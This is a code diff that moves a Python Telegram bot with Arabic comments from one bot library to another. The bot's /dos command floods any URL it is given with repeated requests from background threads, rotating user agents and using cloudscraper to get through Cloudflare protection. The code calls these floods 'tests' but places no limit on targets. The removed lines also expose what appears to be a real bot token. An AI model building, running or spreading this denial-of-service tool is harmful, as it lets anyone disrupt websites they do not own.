@@ -4,11 +4,11 @@ import random
 import string
 from fake_useragent import UserAgent
 from cloudscraper import create_scraper
-from telegram import Update
-from telegram.ext import Application, CommandHandler, ContextTypes
+import telebot
 
 # إعدادات البوت
-TOKEN = "7521359698:AAG5ttQFaDQOAbOj_CLhX0PTZlATo7BEH6Y"  # استبدل هذا بتوكن البوت الخاص بك من BotFather
+TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"  # استبدل هذا بتوكن البوت الخاص بك
+bot = telebot.TeleBot(TOKEN)
 ua = UserAgent()
 
 # القوائم المستخدمة
@@ -42,10 +42,10 @@ def generate_test_id():
     return ''.join(random.choices(string.ascii_letters + string.digits, k=6))
 
 # دالة إرسال الطلبات
-def send_requests(test_id, url, context):
+def send_requests(test_id, url):
     local_session = create_scraper()
     while test_id in active_tests and active_tests[test_id]["running"]:
-        for _ in range(500):  # تقليل العدد لتجنب الحمل الزائد
+        for _ in range(500):
             try:
                 headers = base_headers.copy()
                 headers["User-Agent"] = ua.random
@@ -57,12 +57,14 @@ def send_requests(test_id, url, context):
         time.sleep(random.uniform(0.1, 0.5))
 
 # أمر /dos
-async def dos_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if len(context.args) != 1:
-        await update.message.reply_text("يرجى إرسال رابط الموقع بعد الأمر. مثال: /dos https://example.com")
+@bot.message_handler(commands=['dos'])
+def dos_command(message):
+    args = message.text.split()
+    if len(args) != 2:
+        bot.reply_to(message, "يرجى إرسال رابط الموقع بعد الأمر. مثال: /dos https://example.com")
         return
 
-    url = context.args[0]
+    url = args[1]
     if not url.startswith("http"):
         url = "https://" + url
 
@@ -70,48 +72,35 @@ async def dos_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     active_tests[test_id] = {
         "url": url,
         "running": True,
-        "thread": threading.Thread(target=send_requests, args=(test_id, url, context), daemon=True)
+        "thread": threading.Thread(target=send_requests, args=(test_id, url), daemon=True)
     }
     active_tests[test_id]["thread"].start()
 
-    await update.message.reply_text(
-        f"تم بدء الاختبار على الموقع {url}\nلإيقاف الاختبار، أرسل الأمر: /{test_id}"
-    )
-
-# أمر إيقاف الاختبار
-async def stop_test(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    test_id = update.message.text[1:]  # إزالة "/"
-    if test_id in active_tests:
-        active_tests[test_id]["running"] = False
-        del active_tests[test_id]
-        await update.message.reply_text("تم إيقاف الاختبار بنجاح.")
-    else:
-        await update.message.reply_text("لم يتم العثور على اختبار بهذا المعرف.")
+    bot.reply_to(message, f"تم بدء الاختبار على الموقع {url}\nلإيقاف الاختبار، أرسل الأمر: /{test_id}")
 
 # أمر /info
-async def info_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+@bot.message_handler(commands=['info'])
+def info_command(message):
     if not active_tests:
-        await update.message.reply_text("لا توجد عمليات اختبار جارية حاليًا.")
+        bot.send_message(message.chat.id, "لا توجد عمليات اختبار جارية حاليًا.")
         return
 
     response = "الاختبارات الجارية:\n"
     for test_id, info in active_tests.items():
         response += f"- الموقع: {info['url']} | أمر الإيقاف: /{test_id}\n"
-    await update.message.reply_text(response)
+    bot.send_message(message.chat.id, response)
 
-# إعداد البوت
-def main():
-    application = Application.builder().token(TOKEN).build()
+# معالجة أوامر الإيقاف ديناميكيًا
+@bot.message_handler(func=lambda message: message.text.startswith('/'))
+def stop_test(message):
+    test_id = message.text[1:]  # إزالة "/"
+    if test_id in active_tests:
+        active_tests[test_id]["running"] = False
+        del active_tests[test_id]
+        bot.send_message(message.chat.id, "تم إيقاف الاختبار بنجاح.")
+    elif test_id not in ["dos", "info"]:  # تجاهل الأوامر الأخرى
+        bot.send_message(message.chat.id, "لم يتم العثور على اختبار بهذا المعرف.")
 
-    # إضافة الأوامر
-    application.add_handler(CommandHandler("dos", dos_command))
-    application.add_handler(CommandHandler("info", info_command))
-    
-    # معالجة أوامر الإيقاف ديناميكيًا
-    application.add_handler(CommandHandler(list(active_tests.keys()), stop_test, pass_args=True))
-
-    # تشغيل البوت
-    application.run_polling()
-
+# تشغيل البوت
 if __name__ == "__main__":
-    main()
+    bot.polling(none_stop=True)
